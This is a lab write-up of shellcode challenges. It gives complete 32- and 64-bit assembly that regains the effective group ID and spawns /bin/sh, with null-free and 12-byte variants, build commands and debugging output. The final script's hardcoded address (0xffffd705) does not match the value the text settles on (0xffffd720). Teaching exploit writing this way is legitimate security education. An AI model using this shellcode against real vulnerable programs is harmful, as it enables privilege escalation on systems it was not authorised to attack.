- [Writing Shellcode](#writing-shellcode)
  - [Compiling](#compiling)
- [Simple Shellcode](#simple-shellcode)
  - [shellcode-32](#shellcode-32)
    - [Full Script + Solve](#full-script--solve)
  - [shellcode-64](#shellcode-64)
    - [Full Script + Solve](#full-script--solve-1)
- [Non-Zero Shellcode](#non-zero-shellcode)
  - [nonzero-shellcode-32](#nonzero-shellcode-32)
    - [Full Script + Solve](#full-script--solve-2)
  - [nonzero-shellcode-64](#nonzero-shellcode-64)
    - [Full Script + Solve](#full-script--solve-3)
- [Short Shellcode](#short-shellcode)
  - [short-shellcode-32](#short-shellcode-32)
    - [Full Script + Solve](#full-script--solve-4)
 
# Writing Shellcode
This is going to be an overview of a handful of the shellcode-based challenges
rather than for just one, as they're similar and more of a stepping stone to 
controlling processes than the be-all and end-all. 

The general goal of these challenges is to write shellcode to
result in the following:
```c
int egid = getegid();
setregid(egid, egid);
execve('/bin/sh', 0, 0);
```

Each challenge generally had a 32bit and 64bit version, denoted by the numbers
on the end of the challenge name. 

## Compiling
```make
error:
  @echo specify 32 or 64

32:
  gcc -m32 -c -o shellcode.o shellcode.S && \
  gcc -o shellcode shellcode.o -m32 && \
  objcopy -S -O binary -j .text shellcode.o shellcode.bin

64:
  gcc -m64 -c -o shellcode.o shellcode.S && \
  gcc -o shellcode shellcode.o -m64 && \
  objcopy -S -O binary -j .text shellcode.o shellcode.bin
```

The binary took `shellcode.bin` and used it to run our code, and then we had a privileged shell
that would allow us to get the flag. 

# Simple Shellcode
For these challenges, we just had to write any shellcode that would accomplish the goal. 
All this required was the general system call calling conventions. 

## shellcode-32
The first call is the easiest as it doesn't have any arguments. We just have to get the 
call number into `%eax` and then use `int 0x80` to make the call. 

```gas
#include <sys/syscall.h>

.globl main
.type main, @function

#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80
```

When calling `setregid()` we have to pass the result of the previous call as
arguments. In IE32 the first few arguments are passed in `%ebx`, `%ecx`, and `%edx`. As usual, the
result of the previous call is in `%eax`. 

```gas
    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80
```

When calling `execve` we need to input our string. To do this, the string has to be 
somewhere in memory. The easiest way to do that is to push it onto the stack. As we do this,
however, we need to keep in mind the length of the string. We push 4 bytes onto the stack at
one time, and our string is only 7 bytes. In order to rectify this, we can add an additional 
`/` to the beginning of the string to pad it out to 8 bytes without changing how it will run. 
We also need to push our null byte. 

```gas
    // execve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```

After we compile our code, we can use `strace` to make sure that functions
are being called the way we want them to. 

```
$ strace ./shellcode
...
getegid()                               = 1019
setregid(1019, 1019)                    = 0
execve("//bin/sh", NULL, NULL)          = 0
...
```

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %eax
    int $0x80

    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    mov $SYS_setregid, %eax
    int $0x80

    // execve("/bin/sh", 0, 0)
    push $0
    push $0x68732f6e
    push $0x69622f2f
    mov $SYS_execve, %eax
    mov %esp, %ebx
    mov $0, %ecx
    mov $0, %edx
    int $0x80
```
```
$ ./shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{execve_bin_sh}
```

## shellcode-64
The main difference between this challenge and the 32bit challenge is the system call numbers, 
the registers that arguments are passed in, and how the system calls are made. Because we are 
using `<sys/syscall.h>` we can ignore the numbers themselves and just use the variables. The 
arguments are passed in the same registers as in the usual 64bit assembly. And instead of using 
`int 0x80`, we use `syscall`. We also can't directly push variables onto the stack,
so we move them into a register and then push the register. 

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    mov $SYS_getegid, %rax
    syscall

    // setregid(getegid(), getegid())
    mov %rax, %rdi
    mov %rax, %rsi
    mov $SYS_setregid, %rax
    syscall

    // execve("/bin/sh", 0, 0)
    mov $0, %rax
    push %rax
    mov $0x68732f6e69622f2f, %rax
    push %rax
    mov $SYS_execve, %rax
    mov %rsp, %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall
```
```
$ ./shellcode-64
Reading shellcode from shellcode.bin

$ cat flag
cand{exEcvE_b1n_5h}
```

# Non-Zero Shellcode
Most of the time, you don't want any null-bytes in your shellcode because they get processed
as being the end of a string with functions that take in input. If we look at the bytes of the 
code for shellcode-32, we see lots of null-bytes. 

```
$ objdump -D shellcode.0
objdump -D shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:   b8 32 00 00 00          mov    $0x32,%eax
   5:   cd 80                   int    $0x80
   7:   89 c3                   mov    %eax,%ebx
   9:   89 c1                   mov    %eax,%ecx
   b:   b8 47 00 00 00          mov    $0x47,%eax
  10:   cd 80                   int    $0x80
  12:   6a 00                   push   $0x0
  14:   68 6e 2f 73 68          push   $0x68732f6e
  19:   68 2f 2f 62 69          push   $0x69622f2f
  1e:   b8 0b 00 00 00          mov    $0xb,%eax
  23:   89 e3                   mov    %esp,%ebx
  25:   b9 00 00 00 00          mov    $0x0,%ecx
  2a:   ba 00 00 00 00          mov    $0x0,%edx
  2f:   cd 80                   int    $0x80
```

As such, the goal in this set of challenges was to remove all null bytes from 
our compiled code. 

## nonzero-shellcode-32
We can use our code for shellcode-32 as a starting point, and then make adjustments
for how to remove the null bytes. 

The first null bytes we see are in the first line, `mov $0x32, %eax`. This is because it's a 4 
byte move; it automatically expands the single byte `0x32` into the 4 byte `0x00000032`. To get
around this, we can push 0x32 onto the stack and pop it into `%eax`. It will still be expanded to
fill the 4 byte register, but that won't show up in our code. 

```gas
    // getegid()
    push $SYS_getegid
    pop %eax
    int $0x80
```

If we check our compiled code again, we see the zeros are gone. 

```
00000000 <main>:
   0:   6a 32                   push   $0x32
   2:   58                      pop    %eax
   3:   cd 80                   int    $0x80
...
```

The same applies to the `setregid` call. 

```gas
    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    push $SYS_setregid
    pop %eax
    int $0x80
```

In order to call `execve` we still need to push our string onto the stack with its null-byte. 
Since we can't push zero directly we can *create* a zero within a register and then push the register. 
While there are multiple ways to do this, the simplest is with `xor`. 

```gas
    xor %eax, %eax
    push %eax
```

Now, we also need to pass zero as arguments, but we can move the same zero we've already created to
do so. Then, we use the push/pop trick from before. 

```gas
    mov %eax, %ecx
    mov %eax, %edx
    push $0x68732f6e
    push $0x69622f2f
    push $SYS_execve
    pop %eax
    mov %esp, %ebx
    int $0x80
```

Now if we look at our compiled code, we don't have any null bytes.

```
00000000 <main>:
   0:   6a 32                   push   $0x32
   2:   58                      pop    %eax
   3:   cd 80                   int    $0x80
   5:   89 c3                   mov    %eax,%ebx
   7:   89 c1                   mov    %eax,%ecx
   9:   6a 47                   push   $0x47
   b:   58                      pop    %eax
   c:   cd 80                   int    $0x80
   e:   31 c0                   xor    %eax,%eax
  10:   50                      push   %eax
  11:   89 c1                   mov    %eax,%ecx
  13:   89 c2                   mov    %eax,%edx
  15:   68 6e 2f 73 68          push   $0x68732f6e
  1a:   68 2f 2f 62 69          push   $0x69622f2f
  1f:   6a 0b                   push   $0xb
  21:   58                      pop    %eax
  22:   89 e3                   mov    %esp,%ebx
  24:   cd 80                   int    $0x80
```

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    push $SYS_getegid
    pop %eax
    int $0x80

    // setregid(getegid(), getegid())
    mov %eax, %ebx
    mov %eax, %ecx
    push $SYS_setregid
    pop %eax
    int $0x80

    // ececve("/bin/sh", 0, 0)
    xor %eax, %eax
    push %eax
    mov %eax, %ecx
    mov %eax, %edx
    push $0x68732f6e
    push $0x69622f2f
    push $SYS_execve
    pop %eax
    mov %esp, %ebx
    int $0x80
```
```
$ ./nonzero-shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{push_aNd_X0R}
```

## nonzero-shellcode-64
Again, we can use our shellcode-64 as a starting point. We can use the same push/pop and xor tricks. 

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // getegid()
    push $SYS_getegid
    pop %rax
    syscall

    // setregid(getegid(), getegid())
    mov %rax, %rdi
    mov %rax, %rsi
    push $SYS_setregid
    pop %rax
    syscall

    // ececve("/bin/sh", 0, 0)
    xor %rax, %rax
    push %rax
    mov %rax, %rsi
    mov %rax, %rdx
    mov $0x68732f6e69622f2f, %rax
    push %rax
    mov %rsp, %rdi
    push $SYS_execve
    pop %rax
    syscall
```
```

$ ./nonzero-shellcode-64
Reading shellcode from shellcode.bin

$ cat flag
cand{n0_puSh_bUt_CLTD}
$
```

# Short Shellcode
We have to be aware of the length of our shellcode because space is limited when working with overflows. The goal of these 
The challenge was to make our code as short as possible with a hard limit of 12 bytes. To make this a little easier, we only had
to run `execve("//bin/sh", 0, 0)` as the program set the regid for us. 

## short-shellcode-32
Again, we can use our code from a previous challenge as a starting point. This time, we'll use the code from `nonzero-shellcode-32`. 

```gas
    // execve("/bin/sh", 0, 0)
    xor %eax, %eax
    push %eax
    mov %eax, %ecx
    mov %eax, %edx
    push $0x68732f6e
    push $0x69622f2f
    push $SYS_execve
    pop %eax
    mov %esp, %ebx
    int $0x80
```

When compiled, we can see it takes up 24 bytes, so we need to cut it in half. 

```
$ xxd shellcode.bin
00000000: 31c0 5089 c189 c268 6e2f 7368 682f 2f62  1.P....hn/shh//b
00000010: 696a 0b58 89e3 cd80                      ij.X....
```

One of the first things that we can change is the zero-ing of `%edx`. The `cltd` command sign-extends `%eax` into `%edx` and only takes one byte 
(as opposed to the two-byte `mov`). We just need to make sure that the MSB of `%eax ` is 0. 

```gas
// ececve("/bin/sh", 0, 0)
push $SYS_execve
pop %eax
cltd
push %edx
push $0x68732f6e
push $0x69622f2f
mov %esp, %ebx
mov %edx, %ecx
int $0x80
```

Now the script takes 21 bytes. While this is certainly better, it's a far cry from where we need to be. 
The piece that takes up the most space is putting `//bin/sh` onto the stack. The string itself takes up 
8 bytes, 2/3 of what we're allowed. 

I moved the string out of the code by putting it into the environment variables. These variables are pushed onto
the stack at the beginning of execution, so they can be accessed the same as any other variable. The key difference is that they're 
declared in the terminal rather than in the code. 

```sh
$ export SHELL="//bin/sh"
```

I used pwntools' `stack.find()` function to get a ballpark of the address of the string. Note that to test with `short-shellcode-32` I had to remove
certain parts of the code (namely setting `%ecx`) to get to the 12-byte limit. 

```py
#!/usr/bin/python3

from pwn import *

c = Core('./core.1498311')

addr = c.stack.find(b"//bin/sh")

print("shellcode at 0x%08x" % addr)
```
```
$ python3 p.py
[+] Parsing corefile...: Done
[*] '/home/sawyeras/week3/short-shellcode-32/core.1502266'
    Arch:      i386-32-little
    EIP:       0xf7fbd00d
    ESP:       0xffffd4bc
    Exe:       '/home/labs/week3/short-shellcode-32/short-shellcode-32' (0x8048000)
shellcode at 0xffffd720
```

Once I had the correct address, I could hardcode it. 

```gas
mov $0xffffd720, %ebx
```

Then we can use `strace` to quickly see whether or not it's working correctly. 

```
$ strace ./short-shellcode-32
...
execve("HELL=//bin/sh", 0xa, NULL)      = -1 ENOENT (No such file or directory)
--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
```

We can see that the address `find()` gave us isn't quite right, but that can be fixed by increasing the address by 5. When we run it again, the string
shows up as expected. 

```
$ strace ./short-shellcode-32
...
execve("//bin/sh", 0xa, NULL)      = -1 ENOENT (No such file or directory)
--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
```

Now our code (when properly setting `%ecx`) is 13 bytes. To shave off that one last byte, we can take advantage of the shortened opcodes for
`%eax`. One of these is that an 8-bit move to `%eax` is a single byte. This means that we can change our two byte `push/pop` into a one byte `mov`. 
And because it's only an 8-bit move, we don't have to worry about `$SYS_execve` being padded and adding any null bytes. 

```
mov $SYS_execve, %al
```

Now when we test with `strace` we can see the shell being created. 

```
$ strace ./short-shellcode-32
...
execve("//bin/sh", NULL, NULL)          = 0
```

When we try to run `short-shellcode-32` directly, however, it doesn't work. 

```
$ ./short-shellcode-32
Reading shellcode from shellcode.bin
Trace/breakpoint trap (core dumped)
```

To figure out what's going wrong, we can look at the core dump in `gdb`. 

```
$ gdb ./short-shellcode-32 core.1502795
...
 EAX  0xfffffffe
 EBX  0xffffd725 ◂— 0x68732f /* '/sh' */
 ECX  0
 EDX  0
...
```

Quickly, we see that `%ebx` isn't being set properly. In fact, `find()` *was* giving us the correct address and it was `strace` that was 
messing with the value. Once we change the address back to `0xffffd720`, it all works as intended. 

### Full Script + Solve
```gas
#include <sys/syscall.h>

.globl main
.type main, @function

main:
    // execve("/bin/sh", 0, 0)
    mov $SYS_execve, %al
    cltd
    mov $0xffffd705, %ebx
    mov %edx, %ecx
    int $0x80
```
```
$ ./short-shellcode-32
Reading shellcode from shellcode.bin

$ cat flag
cand{HoW_m4ny_byt3s_d0_y0u_need?}
$
```
